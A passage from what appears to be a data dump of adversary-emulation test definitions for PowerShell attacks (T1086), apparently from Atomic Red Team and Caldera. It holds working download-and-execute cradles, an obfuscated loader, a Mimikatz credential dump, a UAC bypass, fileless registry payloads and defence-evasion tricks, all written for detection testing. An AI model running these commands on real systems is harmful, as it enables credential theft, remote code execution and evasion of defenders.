                                                                                              '#{file_path}\\SharpHound.ps1) '
                                                                                              '{exit '
                                                                                              '0} '
                                                                                              'else '
                                                                                              '{exit '
                                                                                              '1}\n'}],
                                                          'dependency_executor_name': 'powershell',
                                                          'description': 'Upon '
                                                                         'execution '
                                                                         'SharpHound '
                                                                         'will '
                                                                         'be '
                                                                         'downloaded '
                                                                         'to '
                                                                         'disk, '
                                                                         'imported '
                                                                         'and '
                                                                         'executed. '
                                                                         'It '
                                                                         'will '
                                                                         'set '
                                                                         'up '
                                                                         'collection '
                                                                         'methods, '
                                                                         'run '
                                                                         'and '
                                                                         'then '
                                                                         'compress '
                                                                         'and '
                                                                         'store '
                                                                         'the '
                                                                         'data '
                                                                         'to '
                                                                         'the '
                                                                         'temp '
                                                                         'directory '
                                                                         'on '
                                                                         'the '
                                                                         'machine. '
                                                                         'If '
                                                                         'system '
                                                                         'is '
                                                                         'unable '
                                                                         'to '
                                                                         'contact '
                                                                         'a '
                                                                         'domain, '
                                                                         'proper '
                                                                         'execution '
                                                                         'will '
                                                                         'not '
                                                                         'occur.\n'
                                                                         '\n'
                                                                         'Successful '
                                                                         'execution '
                                                                         'will '
                                                                         'produce '
                                                                         'stdout '
                                                                         'message '
                                                                         'stating '
                                                                         '"SharpHound '
                                                                         'Enumeration '
                                                                         'Completed". '
                                                                         'Upon '
                                                                         'completion, '
                                                                         'final '
                                                                         'output '
                                                                         'will '
                                                                         'be a '
                                                                         '*BloodHound.zip '
                                                                         'file.\n',
                                                          'executor': {'cleanup_command': 'Remove-Item '
                                                                                          '#{file_path}\\SharpHound.ps1 '
                                                                                          '-Force '
                                                                                          '-ErrorAction '
                                                                                          'Ignore\n'
                                                                                          'Remove-Item '
                                                                                          '$env:Temp\\*BloodHound.zip '
                                                                                          '-Force\n',
                                                                       'command': 'write-host '
                                                                                  '"Import '
                                                                                  'and '
                                                                                  'Execution '
                                                                                  'of '
                                                                                  'SharpHound.ps1 '
                                                                                  'from '
                                                                                  '#{file_path}" '
                                                                                  '-ForegroundColor '
                                                                                  'Cyan\n'
                                                                                  'import-module '
                                                                                  '#{file_path}\\SharpHound.ps1\n'
                                                                                  'Invoke-BloodHound '
                                                                                  '-OutputDirectory '
                                                                                  '$env:Temp\n'
                                                                                  'Start-Sleep '
                                                                                  '5\n',
                                                                       'elevation_required': False,
                                                                       'name': 'powershell'},
                                                          'input_arguments': {'file_path': {'default': 'PathToAtomicsFolder\\T1086\\src',
                                                                                            'description': 'File '
                                                                                                           'path '
                                                                                                           'for '
                                                                                                           'SharpHound '
                                                                                                           'payload',
                                                                                            'type': 'String'}},
                                                          'name': 'Run '
                                                                  'BloodHound '
                                                                  'from local '
                                                                  'disk',
                                                          'supported_platforms': ['windows']},
                                                         {'description': 'Upon '
                                                                         'execution '
                                                                         'SharpHound '
                                                                         'will '
                                                                         'load '
                                                                         'into '
                                                                         'memory '
                                                                         'and '
                                                                         'execute '
                                                                         'against '
                                                                         'a '
                                                                         'domain. '
                                                                         'It '
                                                                         'will '
                                                                         'set '
                                                                         'up '
                                                                         'collection '
                                                                         'methods, '
                                                                         'run '
                                                                         'and '
                                                                         'then '
                                                                         'compress '
                                                                         'and '
                                                                         'store '
                                                                         'the '
                                                                         'data '
                                                                         'to '
                                                                         'the '
                                                                         'temp '
                                                                         'directory. '
                                                                         'If '
                                                                         'system '
                                                                         'is '
                                                                         'unable '
                                                                         'to '
                                                                         'contact '
                                                                         'a '
                                                                         'domain, '
                                                                         'proper '
                                                                         'execution '
                                                                         'will '
                                                                         'not '
                                                                         'occur.\n'
                                                                         '\n'
                                                                         'Successful '
                                                                         'execution '
                                                                         'will '
                                                                         'produce '
                                                                         'stdout '
                                                                         'message '
                                                                         'stating '
                                                                         '"SharpHound '
                                                                         'Enumeration '
                                                                         'Completed". '
                                                                         'Upon '
                                                                         'completion, '
                                                                         'final '
                                                                         'output '
                                                                         'will '
                                                                         'be a '
                                                                         '*BloodHound.zip '
                                                                         'file.\n',
                                                          'executor': {'cleanup_command': 'Remove-Item '
                                                                                          '$env:Temp\\*BloodHound.zip '
                                                                                          '-Force\n',
                                                                       'command': 'write-host '
                                                                                  '"Remote '
                                                                                  'download '
                                                                                  'of '
                                                                                  'SharpHound.ps1 '
                                                                                  'into '
                                                                                  'memory, '
                                                                                  'followed '
                                                                                  'by '
                                                                                  'execution '
                                                                                  'of '
                                                                                  'the '
                                                                                  'script" '
                                                                                  '-ForegroundColor '
                                                                                  'Cyan\n'
                                                                                  'IEX '
                                                                                  '(New-Object '
                                                                                  "Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');\n"
                                                                                  'Invoke-BloodHound '
                                                                                  '-OutputDirectory '
                                                                                  '$env:Temp\n'
                                                                                  'Start-Sleep '
                                                                                  '5\n',
                                                                       'elevation_required': False,
                                                                       'name': 'powershell'},
                                                          'name': 'Run '
                                                                  'Bloodhound '
                                                                  'from Memory '
                                                                  'using '
                                                                  'Download '
                                                                  'Cradle',
                                                          'supported_platforms': ['windows']},
                                                         {'description': 'Different '
                                                                         'obfuscated '
                                                                         'methods '
                                                                         'to '
                                                                         'test. '
                                                                         'Upon '
                                                                         'execution, '
                                                                         'reaches '
                                                                         'out '
                                                                         'to '
                                                                         'bit.ly/L3g1t '
                                                                         'and '
                                                                         'displays: '
                                                                         '"SUCCESSFULLY '
                                                                         'EXECUTED '
                                                                         'POWERSHELL '
                                                                         'CODE '
                                                                         'FROM '
                                                                         'REMOTE '
                                                                         'LOCATION"\n',
                                                          'executor': {'command': '(New-Object '
                                                                                  "Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))\n"
                                                                                  '(New-Object '
                                                                                  "Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()\n"
                                                                                  'Set-Variable '
                                                                                  'HJ1 '
                                                                                  "'http://bit.ly/L3g1tCrad1e';SI "
                                                                                  'Variable:/0W '
                                                                                  "'Net.WebClient';Set-Item "
                                                                                  'Variable:\\gH '
                                                                                  "'Default_File_Path.ps1';ls "
                                                                                  '_-*;Set-Variable '
                                                                                  'igZ '
                                                                                  "(.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem "
                                                                                  'Variable:0W).Value);Set-Variable '
                                                                                  'J '
                                                                                  '((((Get-Variable '
                                                                                  'igZ '
                                                                                  "-ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable "
                                                                                  'igZ '
                                                                                  '-ValueOn).((ChildItem '
                                                                                  'Variable:J).Value).Invoke((Get-Item '
                                                                                  'Variable:/HJ1).Value,(GV '
                                                                                  'gH).Value);&( '
                                                                                  "''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT "
                                                                                  '-Enco '
                                                                                  '3 '
                                                                                  '(GV '
                                                                                  'gH).Value)))\n',
                                                                       'elevation_required': False,
                                                                       'name': 'powershell'},
                                                          'name': 'Obfuscation '
                                                                  'Tests',
                                                          'supported_platforms': ['windows']},
                                                         {'description': 'Run '
                                                                         'mimikatz '
                                                                         'via '
                                                                         'PsSendKeys. '
                                                                         'Upon '
                                                                         'execution, '
                                                                         'automated '
                                                                         'actions '
                                                                         'will '
                                                                         'take '
                                                                         'place '
                                                                         'to '
                                                                         'open '
                                                                         'file '
                                                                         'explorer, '
                                                                         'open '
                                                                         'notepad '
                                                                         'and '
                                                                         'input '
                                                                         'code, '
                                                                         'then '
                                                                         'mimikatz '
                                                                         'dump '
                                                                         'info '
                                                                         'will '
                                                                         'be '
                                                                         'displayed.\n',
                                                          'executor': {'command': "$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object "
                                                                                  '-ComObject '
                                                                                  "WScript.Shell;$reg='HKCU:\\Software\\Microsoft\\Notepad';$app='Notepad';$props=(Get-ItemProperty "
                                                                                  "$reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP "
                                                                                  '$reg '
                                                                                  '(Item '
                                                                                  'Variable:_).Value[0] '
                                                                                  '(Variable '
                                                                                  '_).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item '
                                                                                  'Variable:_).Value.id-ieq$curpid}|ForEach{(Variable '
                                                                                  '_).Value.MainWindowTitle})){Start-Sleep '
                                                                                  '-Milliseconds '
                                                                                  '500};While(!$wshell.AppActivate($title)){Start-Sleep '
                                                                                  '-Milliseconds '
                                                                                  "500};$wshell.SendKeys('^o');Start-Sleep "
                                                                                  '-Milliseconds '
                                                                                  "500;@($url,(' "
                                                                                  "'*1000),'~')|ForEach{$wshell.SendKeys((Variable "
                                                                                  '_).Value)};$res=$Null;While($res.Length '
                                                                                  '-lt '
                                                                                  "2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item "
                                                                                  'Variable:_).Value)};Start-Sleep '
                                                                                  '-Milliseconds '
                                                                                  "500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable "
                                                                                  '_).Value)};If(GPS|?{(Item '
                                                                                  "Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item "
                                                                                  "Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP "
                                                                                  '$reg '
                                                                                  '(Item '
                                                                                  'Variable:_).Value '
                                                                                  '$props.((Variable '
                                                                                  '_).Value)};IEX($res);invoke-mimikatz '
                                                                                  '-dumpcr\n',
                                                                       'elevation_required': True,
                                                                       'name': 'powershell'},
                                                          'name': 'Mimikatz - '
                                                                  'Cradlecraft '
                                                                  'PsSendKeys',
                                                          'supported_platforms': ['windows']},
                                                         {'description': 'Note: '
                                                                         'Windows '
                                                                         '10 '
                                                                         'only. '
                                                                         'Upon '
                                                                         'execution '
                                                                         'windows '
                                                                         'backup '
                                                                         'and '
                                                                         'restore '
                                                                         'window '
                                                                         'will '
                                                                         'be '
                                                                         'opened.\n'
                                                                         '\n'
                                                                         'Bypass '
                                                                         'is '
                                                                         'based '
                                                                         'on: '
                                                                         'https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/\n',
                                                          'executor': {'command': 'Powershell.exe '
                                                                                  '"IEX '
                                                                                  '(New-Object '
                                                                                  "Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); "
                                                                                  'Invoke-AppPathBypass '
                                                                                  '-Payload '
                                                                                  '\'C:\\Windows\\System32\\cmd.exe\'"\n',
                                                                       'elevation_required': False,
                                                                       'name': 'command_prompt'},
                                                          'name': 'Invoke-AppPathBypass',
                                                          'supported_platforms': ['windows']},
                                                         {'description': 'Powershell '
                                                                         'MsXml '
                                                                         'COM '
                                                                         'object. '
                                                                         'Not '
                                                                         'proxy '
                                                                         'aware, '
                                                                         'removing '
                                                                         'cache '
                                                                         'although '
                                                                         'does '
                                                                         'not '
                                                                         'appear '
                                                                         'to '
                                                                         'write '
                                                                         'to '
                                                                         'those '
                                                                         'locations. '
                                                                         'Upon '
                                                                         'execution, '
                                                                         '"Download '
                                                                         'Cradle '
                                                                         'test '
                                                                         'success!" '
                                                                         'will '
                                                                         'be '
                                                                         'displayed.\n'
                                                                         '\n'
                                                                         'Provided '
                                                                         'by '
                                                                         'https://github.com/mgreen27/mgreen27.github.io\n',
                                                          'executor': {'command': 'powershell.exe '
                                                                                  '-exec '
                                                                                  'bypass '
                                                                                  '-noprofile '
                                                                                  '"$comMsXml=New-Object '
                                                                                  '-ComObject '
                                                                                  "MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX "
                                                                                  '$comMsXml.ResponseText"\n',
                                                                       'elevation_required': False,
                                                                       'name': 'command_prompt'},
                                                          'input_arguments': {'url': {'default': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/src/test.ps1',
                                                                                      'description': 'url '
                                                                                                     'of '
                                                                                                     'payload '
                                                                                                     'to '
                                                                                                     'execute',
                                                                                      'type': 'url'}},
                                                          'name': 'Powershell '
                                                                  'MsXml COM '
                                                                  'object - '
                                                                  'with prompt',
                                                          'supported_platforms': ['windows']},
                                                         {'description': 'Powershell '
                                                                         'xml '
                                                                         'download '
                                                                         'request. '
                                                                         'Upon '
                                                                         'execution, '
                                                                         '"Download '
                                                                         'Cradle '
                                                                         'test '
                                                                         'success!" '
                                                                         'will '
                                                                         'be '
                                                                         'dispalyed.\n'
                                                                         '\n'
                                                                         'Provided '
                                                                         'by '
                                                                         'https://github.com/mgreen27/mgreen27.github.io\n',
                                                          'executor': {'command': '"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" '
                                                                                  '-exec '
                                                                                  'bypass '
                                                                                  '-noprofile '
                                                                                  '"$Xml '
                                                                                  '= '
                                                                                  '(New-Object '
                                                                                  "System.Xml.XmlDocument);$Xml.Load('#{url}');$Xml.command.a.execute "
                                                                                  '| '
                                                                                  'IEX"\n',
                                                                       'elevation_required': False,
                                                                       'name': 'command_prompt'},
                                                          'input_arguments': {'url': {'default': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/src/test.xml',
                                                                                      'description': 'url '
                                                                                                     'of '
                                                                                                     'payload '
                                                                                                     'to '
                                                                                                     'execute',
                                                                                      'type': 'url'}},
                                                          'name': 'Powershell '
                                                                  'XML '
                                                                  'requests',
                                                          'supported_platforms': ['windows']},
                                                         {'description': 'Powershell '
                                                                         'invoke '
                                                                         'mshta '
                                                                         'to '
                                                                         'download '
                                                                         'payload. '
                                                                         'Upon '
                                                                         'execution, '
                                                                         'a '
                                                                         'new '
                                                                         'PowerShell '
                                                                         'window '
                                                                         'will '
                                                                         'be '
                                                                         'opened '
                                                                         'which '
                                                                         'will '
                                                                         'display '
                                                                         '"Download '
                                                                         'Cradle '
                                                                         'test '
                                                                         'success!".\n'
                                                                         '\n'
                                                                         'Provided '
                                                                         'by '
                                                                         'https://github.com/mgreen27/mgreen27.github.io\n',
                                                          'executor': {'command': 'C:\\Windows\\system32\\cmd.exe '
                                                                                  '/c '
                                                                                  '"mshta.exe '
                                                                                  'javascript:a=GetObject(\'script:#{url}\').Exec();close()"\n',
                                                                       'elevation_required': False,
                                                                       'name': 'command_prompt'},
                                                          'input_arguments': {'url': {'default': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/src/mshta.sct',
                                                                                      'description': 'url '
                                                                                                     'of '
                                                                                                     'payload '
                                                                                                     'to '
                                                                                                     'execute',
                                                                                      'type': 'url'}},
                                                          'name': 'Powershell '
                                                                  'invoke '
                                                                  'mshta.exe '
                                                                  'download',
                                                          'supported_platforms': ['windows']},
                                                         {'description': 'Provided '
                                                                         'by '
                                                                         'https://github.com/mgreen27/mgreen27.github.io\n'
                                                                         'Invoke-DownloadCradle '
                                                                         'is '
                                                                         'used '
                                                                         'to '
                                                                         'generate '
                                                                         'Network '
                                                                         'and '
                                                                         'Endpoint '
                                                                         'artifacts.\n',
                                                          'executor': {'name': 'manual',
                                                                       'steps': '1. '
                                                                                'Open '
                                                                                'Powershell_ise '
                                                                                'as '
                                                                                'a '
                                                                                'Privileged '
                                                                                'Account\n'
                                                                                '2. '
                                                                                'Invoke-DownloadCradle.ps1\n'},
                                                          'name': 'Powershell '
                                                                  'Invoke-DownloadCradle',
                                                          'supported_platforms': ['windows']},
                                                         {'description': 'Execution '
                                                                         'of a '
                                                                         'PowerShell '
                                                                         'payload '
                                                                         'from '
                                                                         'the '
                                                                         'Windows '
                                                                         'Registry '
                                                                         'similar '
                                                                         'to '
                                                                         'that '
                                                                         'seen '
                                                                         'in '
                                                                         'fileless '
                                                                         'malware '
                                                                         'infections. '
                                                                         'Upon '
                                                                         'exection, '
                                                                         'open '
                                                                         '"C:\\Windows\\Temp" '
                                                                         'and '
                                                                         'verify '
                                                                         'that\n'
                                                                         'art-marker.txt '
                                                                         'is '
                                                                         'in '
                                                                         'the '
                                                                         'folder.\n',
                                                          'executor': {'cleanup_command': 'Remove-Item '
                                                                                          '-path '
                                                                                          'C:\\Windows\\Temp\\art-marker.txt '
                                                                                          '-Force '
                                                                                          '-ErrorAction '
                                                                                          'Ignore\n'
                                                                                          'Remove-Item '
                                                                                          'HKCU:\\Software\\Classes\\AtomicRedTeam '
                                                                                          '-Force '
                                                                                          '-ErrorAction '
                                                                                          'Ignore\n',
                                                                       'command': '# '
                                                                                  'Encoded '
                                                                                  'payload '
                                                                                  'in '
                                                                                  'next '
                                                                                  'command '
                                                                                  'is '
                                                                                  'the '
                                                                                  'following '
                                                                                  '"Set-Content '
                                                                                  '-path '
                                                                                  '"$env:SystemRoot/Temp/art-marker.txt" '
                                                                                  '-value '
                                                                                  '"Hello '
                                                                                  'from '
                                                                                  'the '
                                                                                  'Atomic '
                                                                                  'Red '
                                                                                  'Team""\n'
                                                                                  'reg.exe '
                                                                                  'add '
                                                                                  '"HKEY_CURRENT_USER\\Software\\Classes\\AtomicRedTeam" '
                                                                                  '/v '
                                                                                  'ART '
                                                                                  '/t '
                                                                                  'REG_SZ '
                                                                                  '/d '
                                                                                  '"U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI="\n'
                                                                                  'iex '
                                                                                  '([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp '
                                                                                  "'HKCU:\\Software\\Classes\\AtomicRedTeam').ART)))\n",
                                                                       'elevation_required': True,
                                                                       'name': 'powershell'},
                                                          'name': 'PowerShell '
                                                                  'Fileless '
                                                                  'Script '
                                                                  'Execution',
                                                          'supported_platforms': ['windows']},
                                                         {'dependencies': [{'description': 'PowerShell '
                                                                                           'version '
                                                                                           '2 '
                                                                                           'must '
                                                                                           'be '
                                                                                           'installed\n',
                                                                            'get_prereq_command': 'Write-Host  '
                                                                                                  'Automated '
                                                                                                  'installer '
                                                                                                  'not '
                                                                                                  'implemented '
                                                                                                  'yet, '
                                                                                                  'please '
                                                                                                  'install '
                                                                                                  'PowerShell '
                                                                                                  'v2 '
                                                                                                  'manually\n',
                                                                            'prereq_command': 'if(2 '
                                                                                              '-in '
                                                                                              '$PSVersionTable.PSCompatibleVersions.Major) '
                                                                                              '{exit '
                                                                                              '0} '
                                                                                              'else '
                                                                                              '{exit '
                                                                                              '1}\n'}],
                                                          'description': 'This '
                                                                         'test '
                                                                         'requires '
                                                                         'the '
                                                                         'manual '
                                                                         'installation '
                                                                         'of '
                                                                         'PowerShell '
                                                                         'V2.\n'
                                                                         '\n'
                                                                         'Attempts '
                                                                         'to '
                                                                         'run '
                                                                         'powershell '
                                                                         'commands '
                                                                         'in '
                                                                         'version '
                                                                         '2.0 '
                                                                         'https://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/\n',
                                                          'executor': {'command': 'powershell.exe '
                                                                                  '-version '
                                                                                  '2 '
                                                                                  '-Command '
                                                                                  'Write-Host '
                                                                                  '$PSVersion\n',
                                                                       'elevation_required': False,
                                                                       'name': 'powershell'},
                                                          'name': 'PowerShell '
                                                                  'Downgrade '
                                                                  'Attack',
                                                          'supported_platforms': ['windows']},
                                                         {'dependencies': [{'description': 'Homedrive '
                                                                                           'must '
                                                                                           'be '
                                                                                           'an '
                                                                                           'NTFS '
                                                                                           'drive\n',
                                                                            'get_prereq_command': 'Write-Host '
                                                                                                  "Prereq's "
                                                                                                  'for '
                                                                                                  'this '
                                                                                                  'test '
                                                                                                  'cannot '
                                                                                                  'be '
                                                                                                  'met '
                                                                                                  'automatically\n',
                                                                            'prereq_command': 'if((Get-Volume '
                                                                                              '-DriveLetter '
                                                                                              '$env:HOMEDRIVE[0]).FileSystem '
                                                                                              '-contains '
                                                                                              '"NTFS") '
                                                                                              '{exit '
                                                                                              '0} '
                                                                                              'else '
                                                                                              '{exit '
                                                                                              '1}\n'}],
                                                          'description': 'Creates '
                                                                         'a '
                                                                         'file '
                                                                         'with '
                                                                         'an '
                                                                         'alternate '
                                                                         'data '
                                                                         'stream '
                                                                         'and '
                                                                         'simulates '
                                                                         'executing '
                                                                         'that '
                                                                         'hidden '
                                                                         'code/file. '
                                                                         'Upon '
                                                                         'execution, '
                                                                         '"Stream '
                                                                         'Data '
                                                                         'Executed" '
                                                                         'will '
                                                                         'be '
                                                                         'displayed.\n',
                                                          'executor': {'cleanup_command': 'Remove-Item '
                                                                                          '#{ads_file} '
                                                                                          '-Force '
                                                                                          '-ErrorAction '
                                                                                          'Ignore\n',
                                                                       'command': 'Add-Content '
                                                                                  '-Path '
                                                                                  '#{ads_file} '
                                                                                  '-Value '
                                                                                  "'Write-Host "
                                                                                  '"Stream '
                                                                                  'Data '
                                                                                  'Executed"\' '
                                                                                  '-Stream '
                                                                                  "'streamCommand'\n"
                                                                                  '$streamcommand '
                                                                                  '= '
                                                                                  'Get-Content '
                                                                                  '-Path '
                                                                                  '#{ads_file} '
                                                                                  '-Stream '
                                                                                  "'streamcommand'\n"
                                                                                  'Invoke-Expression '
                                                                                  '$streamcommand\n',
                                                                       'elevation_required': False,
                                                                       'name': 'powershell'},
                                                          'input_arguments': {'ads_file': {'default': '$env:TEMP\\NTFS_ADS.txt',
                                                                                           'description': 'File '
                                                                                                          'created '
                                                                                                          'to '
                                                                                                          'store '
                                                                                                          'Alternate '
                                                                                                          'Stream '
                                                                                                          'Data',
                                                                                           'type': 'String'}},
                                                          'name': 'NTFS '
                                                                  'Alternate '
                                                                  'Data Stream '
                                                                  'Access',
                                                          'supported_platforms': ['windows']}],
                                        'attack_technique': 'T1086',
                                        'display_name': 'PowerShell'}},
 {'Mitre Stockpile - Capture running processes via PowerShell': {'description': 'Capture '
                                                                                'running '
                                                                                'processes '
                                                                                'via '
                                                                                'PowerShell',
                                                                 'id': '4d9b079c-9ede-4116-8b14-72ad3a5533af',
                                                                 'name': 'PowerShell '
                                                                         'Process '
                                                                         'Enumeration',
                                                                 'platforms': {'windows': {'psh,pwsh': {'command': 'get-process '
                                                                                                                   '>> '
                                                                                                                   '$env:APPDATA\\vmtools.log;\n'
                                                                                                                   'cat '
                                                                                                                   '$env:APPDATA\\vmtools.log\n'}}},
                                                                 'tactic': 'collection',
                                                                 'technique': {'attack_id': 'T1086',
                                                                               'name': 'PowerShell '
                                                                                       'Collection'}}},
 {'Mitre Stockpile - User enumeration': {'description': 'User enumeration',
                                         'id': '55678719-e76e-4df9-92aa-10655bbd1cf4',
                                         'name': 'cmd.exe information '
                                                 'gathering',
                                         'platforms': {'windows': {'psh': {'command': 'cmd.exe '
                                                                                      '/c '
                                                                                      '"net '
                                                                                      'user" '
                                                                                      '>> '
                                                                                      'C:\\Windows\\temp\\history.log;\n'
                                                                                      'cmd.exe '
                                                                                      '/c '
                                                                                      '"whoami '
                                                                                      '/priv" '
                                                                                      '>> '
                                                                                      'C:\\Windows\\temp\\history.log;\n'
                                                                                      'cmd.exe '
                                                                                      '/c '
                                                                                      '"netstat '
                                                                                      '-ano" '
                                                                                      '>> '
                                                                                      'C:\\Windows\\temp\\history.log;'}}},
                                         'tactic': 'collection',
                                         'technique': {'attack_id': 'T1086',
                                                       'name': 'PowerShell'}}},
 {'Mitre Stockpile - System Information Gathering Script': {'description': 'System '
                                                                           'Information '
                                                                           'Gathering '
                                                                           'Script',
                                                            'id': '702bfdd2-9947-4eda-b551-c3a1ea9a59a2',
                                                            'name': 'PowerShell '
                                                                    'information '
                                                                    'gathering',
                                                            'platforms': {'windows': {'psh,pwsh': {'command': 'powershell.exe '
                                                                                                              '-c '
                                                                                                              '"Get-WmiObject '
                                                                                                              '-class '
                                                                                                              'win32_operatingsystem '
                                                                                                              '| '
                                                                                                              'select '
                                                                                                              '-property '
                                                                                                              '* '
                                                                                                              '| '
                                                                                                              'export-csv '
                                                                                                              'msdebug.log";'}}},
                                                            'tactic': 'collection',
                                                            'technique': {'attack_id': 'T1086',
                                                                          'name': 'PowerShell'}}},
 {'Mitre Stockpile - Determine whether or not UAC is enabled': {'description': 'Determine '
                                                                               'whether '
                                                                               'or '
                                                                               'not '
                                                                               'UAC '
                                                                               'is '
                                                                               'enabled',
                                                                'id': '7c42a30c-c8c7-44c5-80a8-862d364ac1e4',
                                                                'name': 'UAC '
                                                                        'Status',
                                                                'platforms': {'windows': {'psh,pwsh': {'command': 'echo '
                                                                                                                  '$(get-uac)\n'}}},
                                                                'tactic': 'collection',
                                                                'technique': {'attack_id': 'T1086',
                                                                              'name': 'PowerShell '
                                                                                      'Collection'}}},
 {'Mitre Stockpile - Copy powershell to non-standard location and perform triage commands': {'description': 'Copy '
                                                                                                            'powershell '
                                                                                                            'to '
                                                                                                            'non-standard '
                                                                                                            'location '
                                                                                                            'and '
                                                                                                            'perform '
                                                                                                            'triage '
                                                                                                            'commands',
                                                                                             'id': 'e5f9de8f-3df1-4e78-ad92-a784e3f6770d',
                                                                                             'name': 'Move '
                                                                                                     'Powershell '
                                                                                                     '& '
                                                                                                     'triage',
                                                                                             'platforms': {'windows': {'psh': {'command': 'Copy-Item '
                                                                                                                                          'C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe '
                                                                                                                                          'C:\\Windows\\Temp\\debug.exe;\n'
                                                                                                                                          'C:\\Windows\\Temp\\debug.exe '
                                                                                                                                          'get-process '
                                                                                                                                          '>> '
                                                                                                                                          'C:\\Windows\\temp\\debug.log;\n'
                                                                                                                                          'C:\\Windows\\Temp\\debug.exe '
                                                                                                                                          'get-localgroup '
                                                                                                                                          '>> '
                                                                                                                                          'C:\\Windows\\temp\\debug.log;\n'
                                                                                                                                          'C:\\Windows\\Temp\\debug.exe '
                                                                                                                                          'get-localuser '
                                                                                                                                          '>> '
                                                                                                                                          'C:\\Windows\\temp\\debug.log;\n'
                                                                                                                                          'C:\\Windows\\Temp\\debug.exe '
                                                                                                                                          'Get-ItemProperty '
                                                                                                                                          'Registry::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion '
                                                                                                                                          '>> '
                                                                                                                                          'C:\\Windows\\temp\\debug.log;\n'}}},
                                                                                             'tactic': 'defense-evasion',
                                                                                             'technique': {'attack_id': 'T1086',
                                                                                                           'name': 'PowerShell'}}},
 {'Mitre Stockpile - Emulate administrator tasks on a system in a separate process': {'description': 'Emulate '
                                                                                                     'administrator '
                                                                                                     'tasks '
                                                                                                     'on '
                                                                                                     'a '
                                                                                                     'system '
                                                                                                     'in '
                                                                                                     'a '
                                                                                                     'separate '
                                                                                                     'process',
                                                                                      'id': '315cedf1-4a3a-4015-b63f-149d64bacbbc',
                                                                                      'name': 'Emulate '
                                                                                              'Administrator '
                                                                                              'Tasks',
                                                                                      'platforms': {'windows': {'psh,pwsh': {'cleanup': 'Remove-Item '
                                                                                                                                        '-Force '
                                                                                                                                        '-Path '
                                                                                                                                        '".\\Emulate-Administrator-Tasks.ps1"\n',
                                                                                                                             'command': 'start '
                                                                                                                                        'powershell.exe '
                                                                                                                                        '-ArgumentList '
                                                                                                                                        '"-NoP","-StA","-ExecutionPolicy","bypass",".\\Emulate-Administrator-Tasks.ps1"\n',
                                                                                                                             'payloads': ['Emulate-Administrator-Tasks.ps1']}}},
                                                                                      'tactic': 'execution',
                                                                                      'technique': {'attack_id': 'T1086',
                                                                                                    'name': 'PowerShell'}}},
 {'Mitre Stockpile - Download': {'description': 'Download',
                                 'id': 'bfff9006-d1fb-46ce-b173-92cb04e9a031',
                                 'name': 'PowerShell bitly Link Download',
                                 'platforms': {'windows': {'psh': {'command': 'powershell.exe '
                                                                              '-c '
                                                                              'IEX '
                                                                              '(New-Object '
                                                                              'Net.Webclient).downloadstring("https://bit.ly/33H0QXi") \n'}}},
                                 'tactic': 'execution',
                                 'technique': {'attack_id': 'T1086',
                                               'name': 'PowerShell'}}},
 {'Mitre Stockpile - Download': {'description': 'Download',
                                 'id': 'ccdb8caf-c69e-424b-b930-551969450c57',
                                 'name': 'PowerShell Invoke MimiKats',
                                 'platforms': {'windows': {'psh': {'command': 'powershell '
                                                                              '-enc '
